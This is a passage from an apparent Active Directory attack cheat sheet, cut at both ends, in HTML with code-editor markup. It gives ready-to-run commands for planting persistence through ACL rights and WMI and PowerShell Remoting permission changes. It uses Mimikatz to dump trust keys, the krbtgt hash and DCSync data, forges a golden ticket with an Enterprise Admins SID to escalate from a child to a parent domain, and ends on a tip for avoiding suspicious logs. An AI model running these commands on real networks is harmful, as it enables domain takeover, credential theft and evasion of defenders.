class="cm-operator">-match</span> <span class="cm-string">'user1'</span><span class="cm-punctuation">}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-acls---interesting-r">ACLs - Interesting rights</h3>
<p id="bkmrk-the-acls-can-be-used">The ACLs can be used for persistence purpose by adding interesting rights like DCSync, FullControl over the domain, etc. Check the <code>On any objects</code> in the ACLs attacks section. Multiple rights like <strong>All</strong>, <strong>DCSync</strong>, etc, are possible.</p>
<h3 id="bkmrk-acls---security-decr">ACLs - Security Decriptors</h3>
<p id="bkmrk-acls-can-be-modified">ACLs can be modified to allow users to access objects.</p>
<h4 id="bkmrk-wmi">WMI</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 825px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 250px; min-width: 824.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On local machine</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemoteWMI</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On remote machine without explicit credentials</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemoteWMI</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computer</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">namespace</span> <span class="cm-string">'root\cimv2'</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On remote machine with explicit credentials. Only root\cimv2 and nested namespaces</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemoteWMI</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computer</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-identifier">Administrator</span> <span class="cm-operator">-</span><span class="cm-identifier">namespace</span> <span class="cm-string">'root\cimv2'</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On remote machine remove permissions</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemoteWMI</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computer</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">namespace</span> <span class="cm-string">'root\cimv2'</span> <span class="cm-operator">-</span><span class="cm-identifier">Remove</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 250px;"></div><div class="CodeMirror-gutters" style="height: 300px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-powershell-remoting-0">PowerShell Remoting</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 514px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 513.667px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On local machine</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemotePSRemoting</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On remote machine without credentials</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemotePSRemoting</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computer</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On remote machine, remove the permissions</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-RemotePSRemoting</span> <span class="cm-operator">-</span><span class="cm-identifier">UserName</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computer</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Remove</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-remote-registry">Remote Registry</h4>
<p id="bkmrk-with-the-scripts-fro">With the scripts from <strong>DAMP-master</strong>. Permits to realize some actions like credentials dump via the registry.</p>
<h2 id="bkmrk-cross-trust-movement">Cross-Trust Movement</h2>
<h3 id="bkmrk-child-to-parent-doma">Child To Parent Domain</h3>
<p id="bkmrk-escalate-from-a-chil">Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the <strong>Enterprise Admins</strong> group in the SID history field.</p>
<h4 id="bkmrk-with-the-trust-key">With the trust key</h4>
<p id="bkmrk-get-the-trust-key%2C-l">Get the trust key, look at the <code>[in]</code> value in the result</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 521px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 520.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::trust /patch"'</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">dc</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#OR</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::dcsync /user:domain\parentDomain$"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-forge-the-inter-real">Forge the inter-realm TGT :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1570px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1570.43px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"Kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;current_domain_SID&gt; /sids:&lt;enterprise_admins_SID&gt; /rc4:&lt;key&gt; /service:krbtgt /target:parentDomain.local /ticket:trust.kirbi"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-create-a-tgs-with-th">Create a TGS with the previous TGT and access service :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 774px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 774.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#New tools for more fun</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">asktgs</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">trust</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span> <span class="cm-identifier">CIFS</span><span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">parentDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">kirbikator</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">lsa</span> <span class="cm-punctuation">.\</span><span class="cm-identifier">CIFS</span><span class="cm-punctuation">.</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">parentDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">ls</span> <span class="cm-punctuation">\\</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">parentDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">\</span><span class="cm-identifier">c</span><span class="cm-error">$</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Or classicaly</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">asktgs</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:</span><span class="cm-identifier">trust</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span> <span class="cm-operator">/</span><span class="cm-identifier">service</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">parentDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">parentDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">ls</span> <span class="cm-punctuation">\\</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">parentDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">\</span><span class="cm-identifier">c</span><span class="cm-error">$</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-with-the-krbtgt-hash">With the krbtgt hash</h4>
<p id="bkmrk-exactly-the-same-att">Exactly the same attack, but with the krbtgt hash that can be extracted like this :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 354px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 354.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::lsa /patch"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-to-avoid-some-suspic">To avoid some suspicious logs, use multiple values can be added in SID History :</p>
